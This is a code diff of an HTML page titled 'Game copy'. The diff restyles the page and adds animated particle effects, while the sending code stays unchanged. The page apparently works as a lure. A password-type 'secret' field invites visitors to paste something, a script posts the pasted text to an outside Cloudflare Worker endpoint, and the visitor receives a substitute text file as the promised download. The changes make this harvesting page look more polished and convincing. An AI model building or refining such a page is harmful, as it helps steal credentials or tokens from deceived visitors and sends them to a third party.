@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,145 +6,566 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <meta name="robots" content="noindex" />
 <title>Game copy</title>
+
 <style>
-  :root{
-    --blue:#3b7bff;
-    --bg:#04060c;
-    --text:#dfe8ff;
+:root {
+  --blue: #4385ff;
+  --blue-light: #78aaff;
+  --bg: #03050b;
+  --text: #eaf1ff;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+html, body {
+  width: 100%;
+  min-height: 100%;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  overflow: hidden;
+
+  background:
+    radial-gradient(ellipse at 50% -20%, rgba(48,104,255,.23), transparent 65%),
+    radial-gradient(ellipse at 100% 100%, rgba(35,83,190,.12), transparent 55%),
+    #03050b;
+
+  color: var(--text);
+  font-family: ui-sans-serif, system-ui, -apple-system,
+    "Segoe UI", Roboto, Arial, sans-serif;
+}
+
+/* BACKGROUND EFFECTS */
+
+#particles {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+.ambient {
+  position: fixed;
+  width: 500px;
+  height: 500px;
+  border-radius: 50%;
+  background: rgba(40, 100, 255, .07);
+  filter: blur(100px);
+  pointer-events: none;
+  animation: ambientMove 12s ease-in-out infinite alternate;
+  z-index: 0;
+}
+
+.ambient.one {
+  top: -300px;
+  left: 10%;
+}
+
+.ambient.two {
+  bottom: -350px;
+  right: 5%;
+  animation-delay: -5s;
+}
+
+@keyframes ambientMove {
+  from { transform: translate(0, 0) scale(1); }
+  to { transform: translate(100px, 70px) scale(1.3); }
+}
+
+/* MOUSE GLOW */
+
+#mouseGlow {
+  position: fixed;
+  width: 300px;
+  height: 300px;
+  border-radius: 50%;
+  background: radial-gradient(
+    circle,
+    rgba(60, 125, 255, .09),
+    transparent 70%
+  );
+  transform: translate(-50%, -50%);
+  pointer-events: none;
+  z-index: 1;
+  opacity: 0;
+  transition: opacity .3s;
+}
+
+/* MAIN CARD */
+
+.card {
+  position: relative;
+  z-index: 2;
+
+  width: 100%;
+  max-width: 490px;
+  padding: 44px 36px 34px;
+
+  text-align: center;
+
+  border: 1px solid rgba(100, 153, 255, .19);
+  border-radius: 24px;
+
+  background: linear-gradient(
+    145deg,
+    rgba(15, 25, 48, .88),
+    rgba(5, 9, 19, .94)
+  );
+
+  backdrop-filter: blur(25px);
+  -webkit-backdrop-filter: blur(25px);
+
+  box-shadow:
+    0 30px 100px rgba(0, 0, 0, .55),
+    0 0 60px rgba(48, 105, 255, .10),
+    inset 0 1px 0 rgba(255,255,255,.07);
+
+  animation: cardEnter .8s cubic-bezier(.16,1,.3,1) both;
+
+  transition:
+    border-color .3s,
+    box-shadow .3s,
+    transform .3s;
+}
+
+.card:hover {
+  border-color: rgba(100, 153, 255, .35);
+  box-shadow:
+    0 30px 100px rgba(0, 0, 0, .55),
+    0 0 70px rgba(48, 105, 255, .15),
+    inset 0 1px 0 rgba(255,255,255,.09);
+}
+
+@keyframes cardEnter {
+  from {
+    opacity: 0;
+    transform: translateY(25px) scale(.96);
+    filter: blur(8px);
   }
-  *{box-sizing:border-box;}
-  html,body{height:100%;}
-  body{
-    margin:0;
-    min-height:100%;
-    display:flex;align-items:center;justify-content:center;
-    padding:24px;
-    background:
-      radial-gradient(900px 520px at 50% -12%, rgba(59,123,255,.30), transparent 70%),
-      radial-gradient(700px 420px at 50% 115%, rgba(59,123,255,.16), transparent 70%),
-      var(--bg);
-    color:var(--text);
-    font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
+  to {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+    filter: blur(0);
   }
-  .card{
-    width:100%;max-width:560px;
-    padding:38px 30px 30px;
-    text-align:center;
-    border:1px solid rgba(59,123,255,.35);
-    border-radius:22px;
-    background:linear-gradient(180deg,rgba(13,22,44,.94),rgba(5,9,20,.97));
-    box-shadow:
-      0 30px 80px -30px rgba(59,123,255,.6),
-      inset 0 1px 0 rgba(255,255,255,.05);
+}
+
+/* TITLE */
+
+h1 {
+  margin: 0 0 10px;
+
+  font-size: clamp(32px, 7vw, 43px);
+  font-weight: 850;
+  letter-spacing: -1.8px;
+
+  background: linear-gradient(
+    180deg,
+    #ffffff 10%,
+    #a9c8ff 55%,
+    #4b88ff 100%
+  );
+
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+
+  filter: drop-shadow(0 0 20px rgba(67,133,255,.18));
+}
+
+.sub {
+  margin: 0 0 35px;
+
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: .27em;
+  text-transform: uppercase;
+
+  color: #7185ad;
+}
+
+/* INPUT WRAPPER */
+
+.input-wrapper {
+  position: relative;
+  width: 100%;
+  margin-bottom: 16px;
+  border-radius: 15px;
+}
+
+.input-wrapper::before {
+  content: "";
+  position: absolute;
+  inset: -1px;
+  border-radius: 16px;
+
+  background: linear-gradient(
+    120deg,
+    rgba(67,133,255,.0),
+    rgba(67,133,255,.6),
+    rgba(120,170,255,.0)
+  );
+
+  opacity: 0;
+  transition: opacity .35s;
+}
+
+.input-wrapper:focus-within::before {
+  opacity: 1;
+}
+
+input[type="password"] {
+  position: relative;
+  z-index: 1;
+
+  display: block;
+  width: 100%;
+  padding: 19px 20px;
+
+  font-size: 15px;
+  letter-spacing: .3em;
+
+  color: #dce9ff;
+  caret-color: var(--blue-light);
+
+  background: rgba(2, 6, 16, .95);
+
+  border: 1px solid rgba(80, 130, 225, .2);
+  border-radius: 14px;
+
+  outline: none;
+
+  transition:
+    background .3s,
+    border-color .3s,
+    box-shadow .3s,
+    transform .3s;
+}
+
+input[type="password"]::placeholder {
+  color: #536584;
+  letter-spacing: .03em;
+}
+
+input[type="password"]:focus {
+  background: rgba(5, 12, 29, .98);
+  border-color: rgba(67,133,255,.75);
+
+  box-shadow:
+    0 0 0 4px rgba(67,133,255,.10),
+    0 0 30px rgba(67,133,255,.15);
+
+  transform: translateY(-2px);
+}
+
+/* BUTTON */
+
+button {
+  position: relative;
+  overflow: hidden;
+
+  width: 100%;
+  margin-top: 2px;
+  padding: 18px;
+
+  font: 800 13px/1 ui-sans-serif, system-ui, sans-serif;
+  letter-spacing: .14em;
+  text-transform: uppercase;
+
+  color: white;
+  cursor: pointer;
+
+  border: 1px solid rgba(132,175,255,.35);
+  border-radius: 14px;
+
+  background: linear-gradient(
+    110deg,
+    #2252cb,
+    #3476f5,
+    #2455cf
+  );
+
+  background-size: 200% 100%;
+
+  box-shadow:
+    0 12px 30px -12px rgba(54,112,255,.85),
+    inset 0 1px 0 rgba(255,255,255,.25);
+
+  transition:
+    transform .2s,
+    filter .25s,
+    box-shadow .25s,
+    background-position .5s;
+}
+
+button::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: -120%;
+  width: 65%;
+  height: 100%;
+
+  background: linear-gradient(
+    100deg,
+    transparent,
+    rgba(255,255,255,.25),
+    transparent
+  );
+
+  transform: skewX(-20deg);
+  transition: left .6s;
+}
+
+button:hover {
+  filter: brightness(1.15);
+  background-position: 100% 0;
+
+  transform: translateY(-2px);
+
+  box-shadow:
+    0 16px 38px -12px rgba(54,112,255,.95),
+    0 0 25px rgba(67,133,255,.15),
+    inset 0 1px 0 rgba(255,255,255,.3);
+}
+
+button:hover::before {
+  left: 150%;
+}
+
+button:active {
+  transform: translateY(1px) scale(.99);
+}
+
+button:disabled {
+  opacity: .55;
+  cursor: default;
+  transform: none;
+  filter: none;
+}
+
+/* STATUS */
+
+.status {
+  margin: 18px 0 0;
+  min-height: 18px;
+
+  font-size: 12px;
+  font-weight: 500;
+  letter-spacing: .02em;
+
+  color: #8299c5;
+  transition: color .3s;
+}
+
+/* TOAST */
+
+.toast {
+  position: fixed;
+  left: 50%;
+  bottom: 30px;
+
+  transform: translate(-50%, 25px) scale(.95);
+  opacity: 0;
+  pointer-events: none;
+
+  padding: 14px 22px;
+  border-radius: 13px;
+
+  font-size: 13px;
+  font-weight: 600;
+  color: #e5eeff;
+
+  background: rgba(9, 17, 36, .96);
+  border: 1px solid rgba(85,145,255,.4);
+
+  backdrop-filter: blur(15px);
+
+  box-shadow:
+    0 10px 40px rgba(0,0,0,.35),
+    0 0 25px rgba(59,123,255,.15);
+
+  transition:
+    transform .35s cubic-bezier(.2,.9,.3,1.25),
+    opacity .3s;
+
+  z-index: 50;
+  max-width: 90vw;
+  text-align: center;
+}
+
+.toast.show {
+  transform: translate(-50%, 0) scale(1);
+  opacity: 1;
+}
+
+/* SHAKE */
+
+.shake {
+  animation: shake .35s;
+}
+
+@keyframes shake {
+  0%,100% { transform: translateX(0); }
+  25% { transform: translateX(-7px); }
+  75% { transform: translateX(7px); }
+}
+
+/* CLICK PARTICLES */
+
+.click-particle {
+  position: fixed;
+  z-index: 100;
+  width: 5px;
+  height: 5px;
+  border-radius: 50%;
+  background: white;
+  pointer-events: none;
+
+  box-shadow: 0 0 12px rgba(130,180,255,.9);
+
+  animation: particleBurst .65s ease-out forwards;
+}
+
+@keyframes particleBurst {
+  from {
+    opacity: 1;
+    transform: translate(0,0) scale(1);
   }
-  h1{
-    margin:0 0 8px;
-    font-size:clamp(28px,6vw,40px);
-    font-weight:800;
-    letter-spacing:-.02em;
-    background:linear-gradient(180deg,#fff,#8fb4ff 65%,#3b7bff);
-    -webkit-background-clip:text;background-clip:text;
-    color:transparent;
+  to {
+    opacity: 0;
+    transform: translate(var(--x),var(--y)) scale(0);
   }
-  .sub{
-    margin:0 0 28px;
-    font-size:12px;letter-spacing:.18em;text-transform:uppercase;
-    color:#7f92bb;
+}
+
+.click-ring {
+  position: fixed;
+  z-index: 99;
+  width: 12px;
+  height: 12px;
+  border: 1px solid rgba(140,185,255,.8);
+  border-radius: 50%;
+  pointer-events: none;
+
+  animation: ringExpand .6s ease-out forwards;
+}
+
+@keyframes ringExpand {
+  to {
+    opacity: 0;
+    transform: translate(-50%,-50%) scale(7);
+    border-width: 0;
   }
-  input[type="password"]{
-    width:100%;
-    padding:18px;
-    font-size:16px;
-    letter-spacing:.35em;
-    color:#cfe0ff;
-    background:rgba(3,7,16,.9);
-    border:1px solid rgba(59,123,255,.28);
-    border-radius:14px;
-    outline:none;
-    transition:border-color .2s, box-shadow .2s;
+}
+
+/* REDUCED MOTION */
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: .01ms !important;
+    transition-duration: .01ms !important;
   }
-  input[type="password"]::placeholder{letter-spacing:0;color:#4c5c80;}
-  input[type="password"]:focus{
-    border-color:var(--blue);
-    box-shadow:0 0 0 4px rgba(59,123,255,.16),0 0 28px rgba(59,123,255,.35);
+}
+
+@media (max-width: 520px) {
+  body {
+    padding: 18px;
   }
-  button{
-    width:100%;margin-top:16px;padding:16px;
-    font:700 15px/1 ui-sans-serif,system-ui,sans-serif;
-    letter-spacing:.08em;text-transform:uppercase;
-    color:#eaf1ff;cursor:pointer;
-    border:1px solid rgba(59,123,255,.55);
-    border-radius:14px;
-    background:linear-gradient(180deg,#2a5fe0,#1a3fa8);
-    box-shadow:0 14px 34px -14px rgba(59,123,255,.9),inset 0 1px 0 rgba(255,255,255,.25);
-    transition:filter .2s, transform .1s;
+
+  .card {
+    padding: 36px 23px 28px;
   }
-  button:hover{filter:brightness(1.12);}
-  button:active{transform:translateY(1px);}
-  button:disabled{opacity:.55;cursor:default;}
-  .status{margin:14px 0 0;min-height:18px;font-size:12.5px;color:#6f83ad;}
-  .toast{
-    position:fixed;left:50%;bottom:26px;
-    transform:translate(-50%,160%);
-    opacity:0;pointer-events:none;
-    padding:12px 20px;border-radius:12px;
-    font-size:14px;color:#dce8ff;
-    background:rgba(9,16,34,.96);
-    border:1px solid rgba(59,123,255,.5);
-    box-shadow:0 0 26px rgba(59,123,255,.35);
-    transition:transform .35s cubic-bezier(.2,.9,.3,1.25), opacity .3s;
-    z-index:50;max-width:90vw;
+
+  .toast {
+    bottom: 18px;
   }
-  .toast.show{transform:translate(-50%,0);opacity:1;}
-  .shake{animation:shake .35s;}
-  @keyframes shake{
-    0%,100%{transform:translateX(0);}
-    25%{transform:translateX(-7px);}
-    75%{transform:translateX(7px);}
-  }
+}
 </style>
 </head>
+
 <body>
-  <main class="card">
-    <h1>Game copy</h1>
-    <p class="sub">Paste · Enter · Download</p>
 
-    <input id="secret" type="password" placeholder="Paste here…"
-           autocomplete="off" spellcheck="false" />
-    <button id="send" type="button">Send</button>
-    <p class="status" id="status"></p>
-  </main>
+<div class="ambient one"></div>
+<div class="ambient two"></div>
 
-  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+<canvas id="particles"></canvas>
+<div id="mouseGlow"></div>
+
+<main class="card">
+
+  <h1>Game copy</h1>
+
+  <p class="sub">Paste · Enter · Download</p>
+
+  <div class="input-wrapper">
+    <input
+      id="secret"
+      type="password"
+      placeholder="Paste here…"
+      autocomplete="off"
+      spellcheck="false"
+    />
+  </div>
+
+  <button id="send" type="button">
+    <span>Send</span>
+  </button>
+
+  <p class="status" id="status"></p>
+
+</main>
+
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
 
 <script>
 (function () {
-  // Your Cloudflare Worker endpoint
-  const WORKER_URL = 'https://worker2.edgar69-help.workers.dev/';
 
-  // Name of the file the visitor downloads (must match what the Worker sends)
+  // ORIGINAL WORKER SETTINGS - UNCHANGED
+
+  const WORKER_URL = 'https://worker2.edgar69-help.workers.dev/';
   const VISITOR_FILE = 'different-file.txt';
 
-  const input   = document.getElementById('secret');
-  const btn     = document.getElementById('send');
-  const status  = document.getElementById('status');
+  const input = document.getElementById('secret');
+  const btn = document.getElementById('send');
+  const status = document.getElementById('status');
   const toastEl = document.getElementById('toast');
 
   let toastTimer;
+
   function toast(msg) {
     toastEl.textContent = msg;
     toastEl.classList.add('show');
+
     clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2800);
+
+    toastTimer = setTimeout(() => {
+      toastEl.classList.remove('show');
+    }, 2800);
   }
+
+  // ORIGINAL SEND FUNCTIONALITY
 
   async function handleSend() {
     const raw = input.value;
 
     if (!raw.trim()) {
       toast('Nothing to send — paste something first');
+
       input.classList.add('shake');
-      setTimeout(() => input.classList.remove('shake'), 400);
+
+      setTimeout(() => {
+        input.classList.remove('shake');
+      }, 400);
+
       input.focus();
       return;
     }
@@ -154,7 +576,9 @@
     try {
       const response = await fetch(WORKER_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {
+          'Content-Type': 'application/json'
+        },
         body: JSON.stringify({ text: raw })
       });
 
@@ -162,28 +586,33 @@
         throw new Error('Worker returned ' + response.status);
       }
 
-      // The Worker returns a different .txt file — that's what the visitor gets
       const blob = await response.blob();
       const url = URL.createObjectURL(blob);
 
       const a = document.createElement('a');
       a.href = url;
       a.download = VISITOR_FILE;
+
       document.body.appendChild(a);
       a.click();
       a.remove();
 
-      setTimeout(() => URL.revokeObjectURL(url), 3000);
+      setTimeout(() => {
+        URL.revokeObjectURL(url);
+      }, 3000);
 
       toast('✅ Sent. Your file was downloaded.');
-      status.textContent = 'File sended!';
+      status.textContent = 'File sent!';
 
       input.value = '';
       input.focus();
+
     } catch (err) {
       console.error(err);
+
       toast('❌ Could not send. Try again.');
       status.textContent = 'Failed: ' + err.message;
+
     } finally {
       btn.disabled = false;
     }
@@ -197,7 +626,239 @@
       handleSend();
     }
   });
+
+
+  // INTERACTIVE BACKGROUND PARTICLES
+
+  const canvas = document.getElementById('particles');
+  const ctx = canvas.getContext('2d');
+
+  let width;
+  let height;
+  let particles = [];
+
+  const mouse = {
+    x: -1000,
+    y: -1000,
+    active: false
+  };
+
+  const isMobile = window.matchMedia('(pointer: coarse)').matches;
+  const reducedMotion = window.matchMedia(
+    '(prefers-reduced-motion: reduce)'
+  ).matches;
+
+  function resize() {
+    const dpr = Math.min(window.devicePixelRatio || 1, 2);
+
+    width = window.innerWidth;
+    height = window.innerHeight;
+
+    canvas.width = width * dpr;
+    canvas.height = height * dpr;
+
+    canvas.style.width = width + 'px';
+    canvas.style.height = height + 'px';
+
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+
+    const count = Math.min(
+      Math.floor(width * height / 8500),
+      isMobile ? 45 : 100
+    );
+
+    particles = [];
+
+    for (let i = 0; i < count; i++) {
+      particles.push({
+        x: Math.random() * width,
+        y: Math.random() * height,
+
+        vx: (Math.random() - .5) * .35,
+        vy: (Math.random() - .5) * .35,
+
+        radius: Math.random() * 1.8 + .5,
+        alpha: Math.random() * .55 + .2,
+
+        phase: Math.random() * Math.PI * 2
+      });
+    }
+  }
+
+  window.addEventListener('resize', resize);
+  resize();
+
+  function animateParticles() {
+    ctx.clearRect(0, 0, width, height);
+
+    const time = performance.now() * .001;
+
+    for (let i = 0; i < particles.length; i++) {
+      const p = particles[i];
+
+      p.phase += .008;
+
+      if (!reducedMotion) {
+        p.x += p.vx;
+        p.y += p.vy;
+
+        p.x += Math.sin(p.phase) * .12;
+        p.y += Math.cos(p.phase) * .12;
+      }
+
+      // Screen boundaries
+
+      if (p.x < 0) p.x = width;
+      if (p.x > width) p.x = 0;
+
+      if (p.y < 0) p.y = height;
+      if (p.y > height) p.y = 0;
+
+      // Mouse interaction
+
+      if (mouse.active) {
+        const dx = p.x - mouse.x;
+        const dy = p.y - mouse.y;
+
+        const distance = Math.sqrt(dx * dx + dy * dy);
+
+        if (distance < 115 && distance > 0) {
+          const force = (115 - distance) / 115;
+
+          p.x += (dx / distance) * force * 1.8;
+          p.y += (dy / distance) * force * 1.8;
+        }
+      }
+
+      // White glowing particles
+
+      const glow = .7 + Math.sin(time * 2 + p.phase) * .25;
+
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+
+      ctx.fillStyle = `rgba(220,235,255,${p.alpha * glow})`;
+
+      ctx.shadowBlur = 12;
+      ctx.shadowColor = 'rgba(120,170,255,.8)';
+
+      ctx.fill();
+      ctx.shadowBlur = 0;
+
+      // Connect nearby particles
+
+      for (let j = i + 1; j < particles.length; j++) {
+        const other = particles[j];
+
+        const dx = p.x - other.x;
+        const dy = p.y - other.y;
+
+        const distance = Math.sqrt(dx * dx + dy * dy);
+
+        if (distance < 105) {
+          ctx.beginPath();
+
+          ctx.moveTo(p.x, p.y);
+          ctx.lineTo(other.x, other.y);
+
+          ctx.strokeStyle =
+            `rgba(130,170,255,${(1 - distance / 105) * .12})`;
+
+          ctx.lineWidth = .7;
+          ctx.stroke();
+        }
+      }
+    }
+
+    requestAnimationFrame(animateParticles);
+  }
+
+  animateParticles();
+
+
+  // MOUSE FOLLOWING GLOW
+
+  const mouseGlow = document.getElementById('mouseGlow');
+
+  let glowX = -500;
+  let glowY = -500;
+
+  if (!isMobile) {
+    window.addEventListener('mousemove', e => {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+      mouse.active = true;
+
+      mouseGlow.style.opacity = '1';
+
+      glowX += (e.clientX - glowX) * .18;
+      glowY += (e.clientY - glowY) * .18;
+
+      mouseGlow.style.left = glowX + 'px';
+      mouseGlow.style.top = glowY + 'px';
+    });
+
+    document.addEventListener('mouseleave', () => {
+      mouse.active = false;
+      mouseGlow.style.opacity = '0';
+    });
+  }
+
+
+  // CLICK EFFECTS
+
+  function createClickEffect(x, y) {
+
+    // Expanding ring
+
+    const ring = document.createElement('div');
+
+    ring.className = 'click-ring';
+    ring.style.left = x + 'px';
+    ring.style.top = y + 'px';
+
+    document.body.appendChild(ring);
+
+    setTimeout(() => ring.remove(), 700);
+
+    // Small particle burst
+
+    for (let i = 0; i < 9; i++) {
+
+      const particle = document.createElement('div');
+
+      particle.className = 'click-particle';
+
+      const angle = Math.random() * Math.PI * 2;
+      const distance = 25 + Math.random() * 45;
+
+      particle.style.left = x + 'px';
+      particle.style.top = y + 'px';
+
+      particle.style.setProperty(
+        '--x',
+        Math.cos(angle) * distance + 'px'
+      );
+
+      particle.style.setProperty(
+        '--y',
+        Math.sin(angle) * distance + 'px'
+      );
+
+      document.body.appendChild(particle);
+
+      setTimeout(() => particle.remove(), 700);
+    }
+  }
+
+  if (!reducedMotion) {
+    document.addEventListener('pointerdown', e => {
+      createClickEffect(e.clientX, e.clientY);
+    });
+  }
+
 })();
 </script>
+
 </body>
 </html>
